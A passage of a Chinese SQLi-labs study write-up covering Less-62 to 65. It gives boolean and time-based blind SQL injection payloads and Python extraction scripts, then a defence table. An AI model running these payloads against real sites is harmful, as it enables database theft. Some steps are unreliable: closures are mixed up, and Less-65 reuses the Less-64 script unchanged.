| 真假特征 | 固定用同一判断条件（如页面某段 HTML 是否出现） |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `')` |
| 手法 | 布尔盲注 |
| 限额 | ~130 queries |
| 目标 | 表名 → secret 列名 → key 值 |

***

### Less-63：GET · Challenges · 闭合 `'` · 布尔盲注（约 130 次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-63/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `'`（单引号，无括号） |
| 主手法 | **布尔盲注** |
| 尝试次数 | 约 **130 次** |
| 目标库 | `challenges`，表名/列名/密钥随机 |
| 与 Less-62 差异 | 仅闭合从 `')` 改为 `'`，流程相同 |

#### 源码逻辑（理解用）

类似 `WHERE id='$id'`。无报错、无联合回显，靠真假页盲注；数据仍在 `challenges` 随机表。

#### 解题步骤

**1）确认闭合与真假**

```latex
?id=1' and 1=1--+
?id=1' and 1=2--+
```

真假可区分 → 单引号布尔盲注。

![1791458624516-c9653751-62ed-482e-bb20-7b0ef9e94c21.png](./img/285943702/1791458624516-c9653751-62ed-482e-bb20-7b0ef9e94c21-440644.png)

![1791458635414-94e602cb-e0e2-4e0e-bd26-376b2306e553.png](./img/285943702/1791458635414-94e602cb-e0e2-4e0e-bd26-376b2306e553-980319.png)

**2）库名长度及库名**

```latex
?id=1' and length(database())=10--+

第一个字符
?id=1') and ascii(substr(database(),1,1))>100--+
第二个字符
?id=1') and ascii(substr(database(),2,1))>100--+
第三个字符
?id=1') and ascii(substr(database(),3,1))>100--+
第四个字符
?id=1') and ascii(substr(database(),4,1))>100--+
第五个字符
?id=1') and ascii(substr(database(),5,1))>100--+
第六个字符
?id=1') and ascii(substr(database(),6,1))>100--+
第七个字符
?id=1') and ascii(substr(database(),7,1))>100--+
第八个字符
?id=1') and ascii(substr(database(),8,1))>100--+
第九个字符
?id=1') and ascii(substr(database(),9,1))>100--+
第十个字符
?id=1') and ascii(substr(database(),10,1))>100--+
```

由此可得完整库名是“challenges“。

![1791460744244-ae0ae254-4cd7-4240-a2ca-5b46f5e090a0.png](./img/285943702/1791460744244-ae0ae254-4cd7-4240-a2ca-5b46f5e090a0-294043.png)

**3）表名长度**

```latex
?id=1' and (select count(table_name) from information_schema.tables where table_schema='challenges')=1--+
```

![1791463069907-f0b98610-83ba-43eb-a9e7-a9fd3736376e.png](./img/285943702/1791463069907-f0b98610-83ba-43eb-a9e7-a9fd3736376e-750980.png)

```latex
?id=1' and length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1))=10--+
```

![1791462963926-3bc6dc45-38ca-4ab0-81ed-d68a4e6bf1e0.png](./img/285943702/1791462963926-3bc6dc45-38ca-4ab0-81ed-d68a4e6bf1e0-232475.png)

**4）逐字符猜表名**

```latex
第一个字符
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>100--+

第二个字符
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>100--+

第三个字符
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>100--+
...

第十个字符
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>100--+
```

二分缩小范围，拼出表名。

![1791462988102-fc4f3112-89ef-40f1-bae5-21ec6add4290.png](./img/285943702/1791462988102-fc4f3112-89ef-40f1-bae5-21ec6add4290-884189.png)

**5）猜 secret 列名**

```latex
?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='随机表名' limit 2,1),1,1))>64--+
```

或利用 `secret_` 前缀只猜后缀。

![1791463226968-343d0819-83a6-4043-80e6-58643783a763.png](./img/285943702/1791463226968-343d0819-83a6-4043-80e6-58643783a763-113158.png)

**6）猜 secret 值**

```latex
?id=1' and length((select secret_列名 from 随机表名 limit 0,1))=24--+
```

![1791463276624-098050e1-a261-449d-804f-f273325c471e.png](./img/285943702/1791463276624-098050e1-a261-449d-804f-f273325c471e-898930.png)

```latex
?id=1' and ascii(substr((select secret_列名 from 随机表名 limit 0,1),1,1))>64--+
```

![1791463346981-ec8f2873-341f-48ea-8d29-586c3693362c.png](./img/285943702/1791463346981-ec8f2873-341f-48ea-8d29-586c3693362c-729752.png)

**6）提交密钥**

填入页面完成挑战。

![1791463363738-a6975afe-d5ec-4e5c-9084-5d99dc0222b7.png](./img/285943702/1791463363738-a6975afe-d5ec-4e5c-9084-5d99dc0222b7-123629.png)

![1791463372148-72ed9f5e-34c0-4585-b45a-1206997ca800.png](./img/285943702/1791463372148-72ed9f5e-34c0-4585-b45a-1206997ca800-825196.png)

这里通过手注测试，130 次是不够用的，这关得用脚本过。

引用大佬的脚本：<https://www.jianshu.com/p/f1811e108d58>

python 脚本如下：

```latex
#!/usr/bin/python3
# -*-coding:utf-8-*-

import re
import requests

url = "http://sqli-labs/Less-63/index.php"  # 改成你的地址
try_count = 0

def extract_bits(query, i, bit_values: list):
    """
    获取query执行结果的第 i 个（从1开始算）字符的3个比特
    哪3个比特由bit_values指定
    """
    global try_count

    assert len(bit_values) == 8
    bit_marks = 0
    for v in bit_values:
        bit_marks |= v

    payload = """
    '+(
SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) & ({bit_mark})
    WHEN {0} THEN 1
    WHEN {1} THEN 2
    WHEN {2} THEN 3
    WHEN {3} THEN 4
    WHEN {4} THEN 5
    WHEN {5} THEN 6
    WHEN {6} THEN 7
    ELSE 8
END
)+'
    """.format(*bit_values[:7], query=query, bit_mark=bit_marks, i=i)
    payload = re.sub(r'\s+', ' ', payload.strip().replace("\n", " "))
    # print(payload)

    resp = requests.get(url, params={"id": payload})
    try_count += 1

    infos = ["Angelina", "Dummy", "secure", "stupid", "superman", "batman", "admin", "admin1"]

    match = re.search(r"Your Login name : (.*?)<br>", resp.text)
    assert match
    assert match.group(1) in infos
    bits = bit_values[infos.index(match.group(1))]
    return bits

def extract_data(query, length):
    """
    获取query查询结果的length个字符，每个字符只获取其第7位和前5位
    """
    res = ""
    for i in range(1, length+1):
        b2 = extract_bits(query, i, [0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111])  # 00000111
        b1 = extract_bits(query, i, [0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000])  # 01011000
        if b1 & 0b01000000 == 0:
            # 该字符为数字
            bit = b1 | b2 | 0b00100000
        else:
            # 该字符为字母
            bit = b1 | b2
        res += chr(bit)
    return res


if __name__ == "__main__":
    table_name = extract_data("select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1", 10)
    print("table_name:", table_name)

    secret_key = extract_data("select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name, 24)
    print("secret_key:", secret_key)

    print("Done. try_count:", try_count)

```

运行后如图所示，只需要大约 60 多次就猜解出来了。

```latex
python less63.py
```

![1791463543424-b0fcda5b-5b4e-4f09-8502-d5906fcc2299.png](./img/285943702/1791463543424-b0fcda5b-5b4e-4f09-8502-d5906fcc2299-427869.png)

![1791463555454-d1bcfbd6-3326-4a06-84b5-632f5d664b14.png](./img/285943702/1791463555454-d1bcfbd6-3326-4a06-84b5-632f5d664b14-668682.png)

![1791463564875-5723cf36-d0bb-472a-aa1b-67cabfed6e9a.png](./img/285943702/1791463564875-5723cf36-d0bb-472a-aa1b-67cabfed6e9a-349135.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'` |
| 手法 | 布尔盲注（同 62） |
| 限额 | ~130 |
| 对照 | 62 用 `')`；63 用 `'` |

***

### Less-64：GET · Challenges · 数字型 · 布尔盲注（约 130 次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-64/?id=1` |
| 注入方式 | GET |
| 类型 | **数字型**（无引号包裹 `$id`） |
| 主手法 | **布尔盲注**（无联合回显、无报错回显） |
| 尝试次数 | 约 **130 次** |
| 目标库 | `challenges`，表名/列名/密钥随机 |
| 目标 | 限次内猜出 secret key 并提交 |
| 与 62/63 差异 | 无需 `'` / `')` 闭合，条件直接接在数字后 |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id=$id LIMIT 0,1
```

整型注入；页面仅「有数据 / 无数据」两类表现，靠真假页盲注。挑战数据在 `challenges` 随机表。

#### 解题步骤

**1）确认数字型与真假**

```latex
?id=1 and 1=1
?id=1 and 1=2
```

或

```latex
?id=1)) and 1=1--+
?id=1)) and 1=2--+
```

前者正常、后者异常 → 布尔盲注可用，且为数字型。

![1791464178794-9f039ea4-b33c-4490-9ac7-d98191f7a070.png](./img/285943702/1791464178794-9f039ea4-b33c-4490-9ac7-d98191f7a070-213514.png)

![1791464189681-3b2e08bc-044f-4ad9-a8f6-89cdb82fb833.png](./img/285943702/1791464189681-3b2e08bc-044f-4ad9-a8f6-89cdb82fb833-642197.png)

**2）表名长度**

```latex
?id=1 and length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1))=10
```

常见约 10 字符，以本地真假为准。

![1791464587758-ca110d07-db4a-4643-9b4f-9ed7015e0589.png](./img/285943702/1791464587758-ca110d07-db4a-4643-9b4f-9ed7015e0589-961288.png)

**3）逐字符猜表名（二分 ASCII）**

```latex
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>100
```

对位置 2、3… 重复，拼出完整表名。

![1791464859684-96d8b537-623b-4203-bbea-f6cda653fb03.png](./img/285943702/1791464859684-96d8b537-623b-4203-bbea-f6cda653fb03-687961.png)

**4）猜 secret 列名**

```latex
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='随机表名' limit 2,1),1,1))=115
```

可利用前缀 `secret_`，只盲注后缀以省次数。

![1791464965746-3175f372-c68b-4b6a-8b96-2fe218a4aca1.png](./img/285943702/1791464965746-3175f372-c68b-4b6a-8b96-2fe218a4aca1-952873.png)

**5）猜 secret 值**

```latex
?id=1 and length((select secret_列名 from 随机表名 limit 0,1))=24
```

![1791465156834-30aaadd4-c4a6-41e5-b82a-4e76a1e3e07f.png](./img/285943702/1791465156834-30aaadd4-c4a6-41e5-b82a-4e76a1e3e07f-137784.png)

```latex
?id=1 and ascii(substr((select secret_列名 from 随机表名 limit 0,1),1,1))>64
```

密钥常见约 24 字符，二分逐位即可。

![1791465203250-f08cd731-2342-4b3e-8c4d-03d19134cd0e.png](./img/285943702/1791465203250-f08cd731-2342-4b3e-8c4d-03d19134cd0e-565590.png)

**6）提交密钥**

拼出完整 key 后填入页面验证。

![1791465218905-c83b0496-d73b-4076-8f47-134aae0fb518.png](./img/285943702/1791465218905-c83b0496-d73b-4076-8f47-134aae0fb518-451695.png)

![1791465226343-49bb9f1f-20fd-4ac9-ae8c-44e8fc2b85db.png](./img/285943702/1791465226343-49bb9f1f-20fd-4ac9-ae8c-44e8fc2b85db-673308.png)

这里通过手注测试，130 次是不够用的，这关得用脚本过。

使用的是时间盲注的办法

python 脚本如下：

```latex
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLi-Labs Less-64 时间盲注完整脚本
闭合：))
"""

import requests
import time

url = "http://sqli-labs/Less-64/"   # 改成你的地址
delay = 3

def check(payload):
    full = f"{url}?id=1)) and if({payload},sleep({delay}),0)--+"
    start = time.time()
    try:
        requests.get(full, timeout=delay+3)
    except:
        pass
    return time.time() - start >= delay - 0.5

def get_length(query):
    print(f"[*] 获取长度: {query}")
    for i in range(1, 50):
        if check(f"length(({query}))={i}"):
            print(f"[+] 长度 = {i}")
            return i
    return 0

def get_data(query):
    length = get_length(query)
    if not length:
        return ""
    result = ""
    for pos in range(1, length+1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if check(f"ascii(substr(({query}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[{pos}/{length}] {result}")
    return result

def main():
    print("="*50)
    print("Less-64 时间盲注")
    print("="*50)

    # 1. 数据库名
    db = get_data("select database()")
    print(f"\n[+] 数据库名: {db}\n")

    # 2. 表名
    table = get_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
    print(f"\n[+] 表名: {table}\n")

    # 3. 字段名（通常 secret 在第3个字段左右）
    columns = []
    for i in range(5):  # 最多取5个字段
        col = get_data(f"select column_name from information_schema.columns where table_schema='{db}' and table_name='{table}' limit {i},1")
        if not col:
            break
        columns.append(col)
        print(f"[+] 字段{i+1}: {col}")

    # 4. 找 secret 字段并提取
    secret_col = next((c for c in columns if "secret" in c.lower()), columns[-1] if columns else None)
    if secret_col:
        print(f"\n[*] 提取密钥字段: {secret_col}")
        secret = get_data(f"select {secret_col} from {table} limit 0,1")
        print("\n" + "="*50)
        print(f"[✓] Secret Key: {secret}")
        print("="*50)

if __name__ == "__main__":
    main()
```

运行后如图所示。

```latex
python less64.py
```

![1791545822968-3b165017-b691-4723-be1c-a169f98cb997.png](./img/285943702/1791545822968-3b165017-b691-4723-be1c-a169f98cb997-258987.png)

![1791545837213-d8fb1ad1-c988-48b4-9d59-0a6f93cca2aa.png](./img/285943702/1791545837213-d8fb1ad1-c988-48b4-9d59-0a6f93cca2aa-441449.png)

![1791545844758-caf38be6-9ccc-4ff6-b276-0354d6ef1b25.png](./img/285943702/1791545844758-caf38be6-9ccc-4ff6-b276-0354d6ef1b25-659878.png)

#### 省次数要点

| 技巧 | 说明 |
| --- | --- |
| 二分法 | 每字符约 7 次 |
| 已知规律 | 表名长度、`secret_` 前缀、key 长度先测再爆 |
| 脚本 | 130 次内推荐布尔脚本 |
| 真假特征 | 固定用同一页面差异判断 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 类型 | 数字型，无引号 |
| 手法 | 布尔盲注 |
| 限额 | ~130 |
| 对照 | 62：`')`；63：`'`；64：整型 |

***

### Less-65：GET · Challenges · 闭合 `")` · 布尔盲注（约 130 次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-65/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `")`（双引号 + 右括号） |
| 主手法 | **布尔盲注** |
| 尝试次数 | 约 **130 次** |
| 目标库 | `challenges`，表名/列名/密钥随机 |
| 目标 | 限次内猜出 secret key 并提交 |
| 与前后关 | 62 为 `')`，63 为 `'`，64 为数字，65 为 `")`；手法同为布尔盲注 |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id=("$id") LIMIT 0,1
```

需用 `")` 闭合；无报错、无联合回显，靠真假页推断。数据在 `challenges` 随机表。

#### 解题步骤

**1）确认闭合与真假**

```latex
?id=1"
?id=1")
?id=1") and 1=1--+
?id=1") and 1=2--+
```

`1") and 1=1--+` 正常、`1=2` 异常 → 闭合为 `")`，布尔可用。

![1791546108531-b4d9ff11-3a8c-43b9-90cd-f6e9f2aed37a.png](./img/285943702/1791546108531-b4d9ff11-3a8c-43b9-90cd-f6e9f2aed37a-961929.png)

![1791546119483-14c72e8f-e311-4e60-b8a2-fd06be001805.png](./img/285943702/1791546119483-14c72e8f-e311-4e60-b8a2-fd06be001805-209182.png)

![1791546135989-a0be442f-51b2-4d76-b2f3-a3bd41705fb9.png](./img/285943702/1791546135989-a0be442f-51b2-4d76-b2f3-a3bd41705fb9-699119.png)

![1791546147173-baef445f-3c33-4727-89e4-d0754c3d79d9.png](./img/285943702/1791546147173-baef445f-3c33-4727-89e4-d0754c3d79d9-787892.png)

**2）表名长度**

```latex
?id=1") and length(database())=10--+
```

![1791547444102-a3896f9e-6aea-43aa-8168-7cb263af8436.png](./img/285943702/1791547444102-a3896f9e-6aea-43aa-8168-7cb263af8436-136936.png)

**3）逐字符猜表名**

```latex
?id=1") and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>100--+
```

二分缩小范围，拼出表名。

![1791547755511-46b0893b-0a26-407a-84de-2f8bb4b1b8ed.png](./img/285943702/1791547755511-46b0893b-0a26-407a-84de-2f8bb4b1b8ed-321958.png)

**4）猜 secret 列名**

```latex
?id=1") and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='随机表名' limit 2,1),1,1))>64--+
```

或固定前缀 `secret_`，只猜后缀。

![1791547919013-6c97e17a-c774-4faf-9259-f408decd6ad6.png](./img/285943702/1791547919013-6c97e17a-c774-4faf-9259-f408decd6ad6-559951.png)

**5）猜 secret 值**

```latex
?id=1") and length((select secret_列名 from 随机表名 limit 0,1))=24--+
```

![1791547961903-aa0e65c4-1b51-4f72-ada9-9c3d5ea26ef8.png](./img/285943702/1791547961903-aa0e65c4-1b51-4f72-ada9-9c3d5ea26ef8-931365.png)

```latex
?id=1") and ascii(substr((select secret_列名 from 随机表名 limit 0,1),1,1))>64--+
```

![1791548001111-5abea848-841a-4dd5-acd8-fd56988dd6ec.png](./img/285943702/1791548001111-5abea848-841a-4dd5-acd8-fd56988dd6ec-480488.png)

**6）提交密钥**

填入页面完成挑战。

![1791548015566-93ca066e-2035-44f9-93a0-f31ddb71d1b1.png](./img/285943702/1791548015566-93ca066e-2035-44f9-93a0-f31ddb71d1b1-774644.png)

![1791548022138-4b66f5f1-c416-4e10-9800-cc424d8de765.png](./img/285943702/1791548022138-4b66f5f1-c416-4e10-9800-cc424d8de765-356288.png)

这里通过手注测试，130 次是不够用的，这关得用脚本过。

使用的是时间盲注的办法

python 脚本如下：

```latex
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLi-Labs Less-64 时间盲注完整脚本
闭合：))
"""

import requests
import time

url = "http://sqli-labs/Less-64/"   # 改成你的地址
delay = 3

def check(payload):
    full = f"{url}?id=1)) and if({payload},sleep({delay}),0)--+"
    start = time.time()
    try:
        requests.get(full, timeout=delay+3)
    except:
        pass
    return time.time() - start >= delay - 0.5

def get_length(query):
    print(f"[*] 获取长度: {query}")
    for i in range(1, 50):
        if check(f"length(({query}))={i}"):
            print(f"[+] 长度 = {i}")
            return i
    return 0

def get_data(query):
    length = get_length(query)
    if not length:
        return ""
    result = ""
    for pos in range(1, length+1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if check(f"ascii(substr(({query}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[{pos}/{length}] {result}")
    return result

def main():
    print("="*50)
    print("Less-64 时间盲注")
    print("="*50)

    # 1. 数据库名
    db = get_data("select database()")
    print(f"\n[+] 数据库名: {db}\n")

    # 2. 表名
    table = get_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
    print(f"\n[+] 表名: {table}\n")

    # 3. 字段名（通常 secret 在第3个字段左右）
    columns = []
    for i in range(5):  # 最多取5个字段
        col = get_data(f"select column_name from information_schema.columns where table_schema='{db}' and table_name='{table}' limit {i},1")
        if not col:
            break
        columns.append(col)
        print(f"[+] 字段{i+1}: {col}")

    # 4. 找 secret 字段并提取
    secret_col = next((c for c in columns if "secret" in c.lower()), columns[-1] if columns else None)
    if secret_col:
        print(f"\n[*] 提取密钥字段: {secret_col}")
        secret = get_data(f"select {secret_col} from {table} limit 0,1")
        print("\n" + "="*50)
        print(f"[✓] Secret Key: {secret}")
        print("="*50)

if __name__ == "__main__":
    main()
```

运行后如图所示。

```latex
python less65.py
```

![1791549550447-741d3bb4-04b5-49e9-b809-b29f92e02bbc.png](./img/285943702/1791549550447-741d3bb4-04b5-49e9-b809-b29f92e02bbc-455019.png)

![1791549560204-99605f14-0209-46d5-b201-e3c3abd7cca7.png](./img/285943702/1791549560204-99605f14-0209-46d5-b201-e3c3abd7cca7-453867.png)

![1791549568223-a38451e5-7516-47bf-a965-ce358c4333ed.png](./img/285943702/1791549568223-a38451e5-7516-47bf-a965-ce358c4333ed-602180.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `")` |
| 手法 | 布尔盲注 |
| 限额 | ~130 |
| 流程 | 表名 → secret 列名 → key 值 |

***

## 6. 关卡速查表（精简）

| Less | 类型概要 |
| --- | --- |
| 1 | GET 单引号字符 · 报错/联合 |
| 2 | GET 整型 |
| 3 | GET `')` |
| 4 | GET `")` |
| 5–6 | 双查询/报错，回显少 |
| 7 | 文件相关提示 |
| 8 | 布尔盲注 |
| 9–10 | 时间盲注 |
| 11–16 | POST 系列 |
| 17 | UPDATE 中注入 |
| 18–19 | UA / Referer |
| 20–22 | Cookie / 二次 |
| 23–28 | 基础过滤绕过 |
| 29–37 | 转义与进阶过滤 |
| 38–53 | 堆叠与综合 |
| 54–61 | 限次 · 报错/联合取 key |
| 62–65 | 限次 · 盲注取 key |

***

## 7. 常见问题

| 问题 | 处理 |
| --- | --- |
| 页面数据库连接失败 | 检查 `db-creds.inc`、MySQL 是否启动、账号权限 |
| Setup 后仍无数据 | 再点一次 resetDB；看 MySQL 用户是否有建库权限 |
| PHP 报 `mysql_*` 未定义 | 换 PHP5 环境或 Docker / PHP7 适配 fork |
| `order by` 一直报错 | 闭合符不对；先只测 `'` `"` `)` 组合 |
| 盲注太慢 | 写脚本；时间盲注把 `sleep` 调到刚能区分即可 |
| Challenge 被重置 | 减少盲目尝试；先在笔记里写好 payload 再提交 |
| `into outfile` 失败 | 权限与 `secure_file_priv` 限制，属正常 |

***

## 8. 防御对照（学完用来写安全方案）

| 问题 | 防御方向 |
| --- | --- |
| 拼接 SQL | 预编译 / 参数化查询（PDO、mysqli 预处理） |
| 报错回显 | 生产环境关闭详细 SQL 错误输出 |
| 盲注 | 参数化 + 最小权限账号 + WAF 辅助 |
| 堆叠 | 禁用多语句；最小权限 |
| 二次注入 | 入库与出库查询均参数化 |
| 管理权限 | 应用账号禁止 `FILE`、禁止写 Web 目录 |

***

## 9. 卸载 / 清理

### 源码部署

```bash
# 删除网站目录
rm -rf /var/www/html/sqli-labs

# 可选：删除 MySQL 中靶场库
mysql -u root -p -e "DROP DATABASE IF EXISTS security;"
```

### Docker

```bash
docker stop sqli-labs
docker rm sqli-labs
docker rmi acgpiano/sqli-labs   # 镜像名以实际为准

# compose 项目
docker compose down -v
```

***

## 10. 学习建议

1. 每关先**自己判闭合**，再查 Writeup
2. 建立个人 payload 模板：联合 / 报错 / 布尔 / 时间
3. 盲注一定要练**自动化**，否则 62–65 会很痛苦
4. 对照源码看 `mysql_query($sql)` 如何拼接，才能理解「为什么能注」
5. 同步记防御：参数化如何改写该关 SQL

***

## 11. 参考资料

* 官方仓库：<https://github.com/Audi-1/sqli-labs>
* 官方 readme 中的安装步骤与知识点列表
* 作者相关讲解可在 SecurityTube / 博客等检索 “Audi sqli labs”（以官方 readme 链接为准）

***

**笔记版本**：v1.0\
**适用对象**：SQL 注入入门 → 进阶（含盲注与 Challenge）\
**维护提示**：PHP 版本与 `mysql_*` 兼容性是本地搭建最大坑，优先 Docker

***


> 更新: 2026-10-09 20:40:23  
> 原文: <https://www.yuque.com/bmxq7n/gqg3ydrla9m0uigo>